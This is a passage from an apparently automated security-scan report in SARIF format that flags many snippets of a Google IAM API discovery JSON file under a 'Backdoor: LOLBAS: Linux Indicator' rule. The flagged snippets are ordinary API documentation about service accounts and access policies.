                  "startLine": 906,
                  "startColumn": 58,
                  "endLine": 906,
                  "endColumn": 67,
                  "snippet": {
                    "text": "Id}/serviceAccounts/{serviceAccountsId}:signBlob\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Signs a blob using a service account's system-managed private key.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n ",
                    "rendered": {
                      "text": "Id}/serviceAccounts/{serviceAccountsId}:signBlob\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Signs a blob using a service account's system-managed private key.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n ",
                      "markdown": "`Id}/serviceAccounts/{serviceAccountsId}:signBlob\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Signs a blob using a service account's system-managed private key.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 903,
                  "startColumn": 50,
                  "endLine": 903,
                  "endColumn": 59,
                  "snippet": {
                    "text": "Blob\": {\n              \"id\": \"iam.projects.serviceAccounts.signBlob\",\n              \"path\": \"v1/{+name}:signBlob\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:signBlob\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Signs a blob using a service account's system-managed private key.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer ",
                    "rendered": {
                      "text": "Blob\": {\n              \"id\": \"iam.projects.serviceAccounts.signBlob\",\n              \"path\": \"v1/{+name}:signBlob\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:signBlob\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Signs a blob using a service account's system-managed private key.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer ",
                      "markdown": "`Blob\": {\n              \"id\": \"iam.projects.serviceAccounts.signBlob\",\n              \"path\": \"v1/{+name}:signBlob\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:signBlob\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Signs a blob using a service account's system-managed private key.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 881,
                  "startColumn": 308,
                  "endLine": 881,
                  "endColumn": 317,
                  "snippet": {
                    "text": "              \"description\": \"Deletes a ServiceAccount.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n",
                    "rendered": {
                      "text": "              \"description\": \"Deletes a ServiceAccount.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n",
                      "markdown": "`              \"description\": \"Deletes a ServiceAccount.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 881,
                  "startColumn": 58,
                  "endLine": 881,
                  "endColumn": 67,
                  "snippet": {
                    "text": "              \"description\": \"Deletes a ServiceAccount.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n",
                    "rendered": {
                      "text": "              \"description\": \"Deletes a ServiceAccount.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n",
                      "markdown": "`              \"description\": \"Deletes a ServiceAccount.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 853,
                  "startColumn": 324,
                  "endLine": 853,
                  "endColumn": 333,
                  "snippet": {
                    "text": "iption\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nRequests using `-` as a wildcard for the project will infer the project\\nfrom the `account` and the `account` value can be the `email` address or\\nthe `unique_id` of the service account.\\n\\nIn responses the resource name will always be in the format\\n`projects\\/{project}\\/serviceAccounts\\/{email}`.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n                  \"type\": ",
                    "rendered": {
                      "text": "iption\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nRequests using `-` as a wildcard for the project will infer the project\\nfrom the `account` and the `account` value can be the `email` address or\\nthe `unique_id` of the service account.\\n\\nIn responses the resource name will always be in the format\\n`projects\\/{project}\\/serviceAccounts\\/{email}`.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n                  \"type\": ",
                      "markdown": "`iption\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nRequests using `-` as a wildcard for the project will infer the project\\nfrom the `account` and the `account` value can be the `email` address or\\nthe `unique_id` of the service account.\\n\\nIn responses the resource name will always be in the format\\n`projects\\/{project}\\/serviceAccounts\\/{email}`.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n                  \"type\": `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 853,
                  "startColumn": 58,
                  "endLine": 853,
                  "endColumn": 67,
                  "snippet": {
                    "text": "        \"httpMethod\": \"PUT\",\n              \"description\": \"Updates a ServiceAccount.\\n\\nCurrently, only the following fields are updatable:\\n`display_name` .\\nThe `etag` is mandatory.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nRequests using `-` as a wildcard for the project will infer the project\\nfrom the `account` and the `account` value can be the `email` address or\\nthe `unique_id` of the service account.\\n\\nIn responses the resou",
                    "rendered": {
                      "text": "        \"httpMethod\": \"PUT\",\n              \"description\": \"Updates a ServiceAccount.\\n\\nCurrently, only the following fields are updatable:\\n`display_name` .\\nThe `etag` is mandatory.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nRequests using `-` as a wildcard for the project will infer the project\\nfrom the `account` and the `account` value can be the `email` address or\\nthe `unique_id` of the service account.\\n\\nIn responses the resou",
                      "markdown": "`        \"httpMethod\": \"PUT\",\n              \"description\": \"Updates a ServiceAccount.\\n\\nCurrently, only the following fields are updatable:\\n`display_name` .\\nThe `etag` is mandatory.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nRequests using `-` as a wildcard for the project will infer the project\\nfrom the `account` and the `account` value can be the `email` address or\\nthe `unique_id` of the service account.\\n\\nIn responses the resou`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 800,
                  "startColumn": 308,
                  "endLine": 800,
                  "endColumn": 317,
                  "snippet": {
                    "text": "              \"description\": \"Gets a ServiceAccount.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n",
                    "rendered": {
                      "text": "              \"description\": \"Gets a ServiceAccount.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n",
                      "markdown": "`              \"description\": \"Gets a ServiceAccount.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 800,
                  "startColumn": 58,
                  "endLine": 800,
                  "endColumn": 67,
                  "snippet": {
                    "text": "              \"description\": \"Gets a ServiceAccount.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n",
                    "rendered": {
                      "text": "              \"description\": \"Gets a ServiceAccount.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n",
                      "markdown": "`              \"description\": \"Gets a ServiceAccount.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 777,
                  "startColumn": 45,
                  "endLine": 777,
                  "endColumn": 54,
                  "snippet": {
                    "text": "                  \"type\": \"string\"\n                },\n                \"removeDeletedServiceAccounts\": {\n                  \"description\": \"Do not list service accounts deleted from Gaia.\\n<b><font color=\\\"red\\\">DO NOT INCLUDE IN EXTERNAL DOCUMENTATION<\\/font><\\/b>.\",\n                  \"location\": \"query\",\n                  \"type\": \"boolean\"\n                }\n",
                    "rendered": {
                      "text": "                  \"type\": \"string\"\n                },\n                \"removeDeletedServiceAccounts\": {\n                  \"description\": \"Do not list service accounts deleted from Gaia.\\n<b><font color=\\\"red\\\">DO NOT INCLUDE IN EXTERNAL DOCUMENTATION<\\/font><\\/b>.\",\n                  \"location\": \"query\",\n                  \"type\": \"boolean\"\n                }\n",
                      "markdown": "`                  \"type\": \"string\"\n                },\n                \"removeDeletedServiceAccounts\": {\n                  \"description\": \"Do not list service accounts deleted from Gaia.\\n<b><font color=\\\"red\\\">DO NOT INCLUDE IN EXTERNAL DOCUMENTATION<\\/font><\\/b>.\",\n                  \"location\": \"query\",\n                  \"type\": \"boolean\"\n                }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 766,
                  "startColumn": 65,
                  "endLine": 766,
                  "endColumn": 74,
                  "snippet": {
                    "text": "                  \"type\": \"string\"\n                },\n                \"pageSize\": {\n                  \"description\": \"Optional limit on the number of service accounts to include in the\\nresponse. Further accounts can subsequently be obtained by including the\\nListServiceAccountsResponse.next_page_token\\nin a subsequent request.\",\n                  \"location\": \"query\",\n                  \"type\": \"integer\",\n                  \"format\": \"int32\"\n",
                    "rendered": {
                      "text": "                  \"type\": \"string\"\n                },\n                \"pageSize\": {\n                  \"description\": \"Optional limit on the number of service accounts to include in the\\nresponse. Further accounts can subsequently be obtained by including the\\nListServiceAccountsResponse.next_page_token\\nin a subsequent request.\",\n                  \"location\": \"query\",\n                  \"type\": \"integer\",\n                  \"format\": \"int32\"\n",
                      "markdown": "`                  \"type\": \"string\"\n                },\n                \"pageSize\": {\n                  \"description\": \"Optional limit on the number of service accounts to include in the\\nresponse. Further accounts can subsequently be obtained by including the\\nListServiceAccountsResponse.next_page_token\\nin a subsequent request.\",\n                  \"location\": \"query\",\n                  \"type\": \"integer\",\n                  \"format\": \"int32\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 556,
                  "startColumn": 887,
                  "endLine": 556,
                  "endColumn": 893,
                  "snippet": {
                    "text": "ty string), resulting in one aggretated counter with no field.\\n\\nExamples:\\n  counter { metric: \\\"\\/debug_access_count\\\"  field: \\\"iam_principal\\\" }\\n  ==> increment counter \\/iam\\/policy\\/backend_debug_access_count\\n                        {iam_principal=[value of IAMContext.principal]}\\n\\nAt this time we do not support:\\n* multiple field names (though this may be supported in the future)\\n* decrementing the counter\\n* incrementing it by anything other than 1\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"counter\": {\n          \"description\": \"Counter options.\",\n          \"$ref\": \"Counter",
                    "rendered": {
                      "text": "ty string), resulting in one aggretated counter with no field.\\n\\nExamples:\\n  counter { metric: \\\"\\/debug_access_count\\\"  field: \\\"iam_principal\\\" }\\n  ==> increment counter \\/iam\\/policy\\/backend_debug_access_count\\n                        {iam_principal=[value of IAMContext.principal]}\\n\\nAt this time we do not support:\\n* multiple field names (though this may be supported in the future)\\n* decrementing the counter\\n* incrementing it by anything other than 1\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"counter\": {\n          \"description\": \"Counter options.\",\n          \"$ref\": \"Counter",
                      "markdown": "`ty string), resulting in one aggretated counter with no field.\\n\\nExamples:\\n  counter { metric: \\\"\\/debug_access_count\\\"  field: \\\"iam_principal\\\" }\\n  ==> increment counter \\/iam\\/policy\\/backend_debug_access_count\\n                        {iam_principal=[value of IAMContext.principal]}\\n\\nAt this time we do not support:\\n* multiple field names (though this may be supported in the future)\\n* decrementing the counter\\n* incrementing it by anything other than 1\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"counter\": {\n          \"description\": \"Counter options.\",\n          \"$ref\": \"Counter`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 500,
                  "startColumn": 60,
                  "endLine": 500,
                  "endColumn": 69,
                  "snippet": {
                    "text": "          ]\n        },\n        \"sys\": {\n          \"description\": \"Trusted attributes supplied by any service that owns resources and uses\\nthe IAM system for access control.\",\n          \"enumDescriptions\": [\n            \"Default non-attribute type\",\n            \"Region of the resource\",\n",
                    "rendered": {
                      "text": "          ]\n        },\n        \"sys\": {\n          \"description\": \"Trusted attributes supplied by any service that owns resources and uses\\nthe IAM system for access control.\",\n          \"enumDescriptions\": [\n            \"Default non-attribute type\",\n            \"Region of the resource\",\n",
                      "markdown": "`          ]\n        },\n        \"sys\": {\n          \"description\": \"Trusted attributes supplied by any service that owns resources and uses\\nthe IAM system for access control.\",\n          \"enumDescriptions\": [\n            \"Default non-attribute type\",\n            \"Region of the resource\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 402,
                  "startColumn": 37,
                  "endLine": 402,
                  "endColumn": 46,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"service\": {\n          \"description\": \"Specifies a service that will be enabled for \\\"data access\\\" audit\\nlogging.\\nFor example, `resourcemanager`, `storage`, `compute`.\\n`allServices` is a special value that covers all services.\",\n          \"type\": \"string\"\n        },\n        \"exemptedMembers\": {\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"service\": {\n          \"description\": \"Specifies a service that will be enabled for \\\"data access\\\" audit\\nlogging.\\nFor example, `resourcemanager`, `storage`, `compute`.\\n`allServices` is a special value that covers all services.\",\n          \"type\": \"string\"\n        },\n        \"exemptedMembers\": {\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"service\": {\n          \"description\": \"Specifies a service that will be enabled for \\\"data access\\\" audit\\nlogging.\\nFor example, `resourcemanager`, `storage`, `compute`.\\n`allServices` is a special value that covers all services.\",\n          \"type\": \"string\"\n        },\n        \"exemptedMembers\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 398,
                  "startColumn": 65,
                  "endLine": 398,
                  "endColumn": 74,
                  "snippet": {
                    "text": "    },\n    \"AuditConfig\": {\n      \"id\": \"AuditConfig\",\n      \"description\": \"Enables \\\"data access\\\" audit logging for a service and specifies a list\\nof members that are log-exempted.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"service\": {\n",
                    "rendered": {
                      "text": "    },\n    \"AuditConfig\": {\n      \"id\": \"AuditConfig\",\n      \"description\": \"Enables \\\"data access\\\" audit logging for a service and specifies a list\\nof members that are log-exempted.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"service\": {\n",
                      "markdown": "`    },\n    \"AuditConfig\": {\n      \"id\": \"AuditConfig\",\n      \"description\": \"Enables \\\"data access\\\" audit logging for a service and specifies a list\\nof members that are log-exempted.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"service\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 388,
                  "startColumn": 390,
                  "endLine": 388,
                  "endColumn": 399,
                  "snippet": {
                    "text": "resource.\\n`members` can have the following values:\\n\\n* `allUsers`: A special identifier that represents anyone who is\\n   on the internet; with or without a Google account.\\n\\n* `allAuthenticatedUsers`: A special identifier that represents anyone\\n   who is authenticated with a Google account or a service account.\\n\\n* `user:{emailid}`: An email address that represents a specific Google\\n   account. For example, `alice@gmail.com` or `joe@example.com`.\\n\\n* `serviceAccount:{emailid}`: An email address that represents a service\\n   account. For example, `my-other-app@appspot.gserviceaccount.com`.\\n\\n* ",
                    "rendered": {
                      "text": "resource.\\n`members` can have the following values:\\n\\n* `allUsers`: A special identifier that represents anyone who is\\n   on the internet; with or without a Google account.\\n\\n* `allAuthenticatedUsers`: A special identifier that represents anyone\\n   who is authenticated with a Google account or a service account.\\n\\n* `user:{emailid}`: An email address that represents a specific Google\\n   account. For example, `alice@gmail.com` or `joe@example.com`.\\n\\n* `serviceAccount:{emailid}`: An email address that represents a service\\n   account. For example, `my-other-app@appspot.gserviceaccount.com`.\\n\\n* ",
                      "markdown": "`resource.\\n`members` can have the following values:\\n\\n* `allUsers`: A special identifier that represents anyone who is\\n   on the internet; with or without a Google account.\\n\\n* `allAuthenticatedUsers`: A special identifier that represents anyone\\n   who is authenticated with a Google account or a service account.\\n\\n* `user:{emailid}`: An email address that represents a specific Google\\n   account. For example, `alice@gmail.com` or `joe@example.com`.\\n\\n* `serviceAccount:{emailid}`: An email address that represents a service\\n   account. For example, `my-other-app@appspot.gserviceaccount.com`.\\n\\n* `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 338,
                  "startColumn": 332,
                  "endLine": 338,
                  "endColumn": 341,
                  "snippet": {
                    "text": " Identity and Access Management (IAM) policy. It is used to\\nspecify access control policies for Cloud Platform resources.\\n\\n\\nA `Policy` consists of a list of `bindings`. A `Binding` binds a list of\\n`members` to a `role`, where the members can be user accounts, Google groups,\\nGoogle domains, and service accounts. A `role` is a named list of permissions\\ndefined by IAM.\\n\\n**Example**\\n\\n    {\\n      \\\"bindings\\\": [\\n        {\\n          \\\"role\\\": \\\"roles\\/owner\\\",\\n          \\\"members\\\": [\\n            \\\"user:mike@example.com\\\",\\n            \\\"group:admins@example.com\\\",\\n            \\\"domain:googl",
                    "rendered": {
                      "text": " Identity and Access Management (IAM) policy. It is used to\\nspecify access control policies for Cloud Platform resources.\\n\\n\\nA `Policy` consists of a list of `bindings`. A `Binding` binds a list of\\n`members` to a `role`, where the members can be user accounts, Google groups,\\nGoogle domains, and service accounts. A `role` is a named list of permissions\\ndefined by IAM.\\n\\n**Example**\\n\\n    {\\n      \\\"bindings\\\": [\\n        {\\n          \\\"role\\\": \\\"roles\\/owner\\\",\\n          \\\"members\\\": [\\n            \\\"user:mike@example.com\\\",\\n            \\\"group:admins@example.com\\\",\\n            \\\"domain:googl",
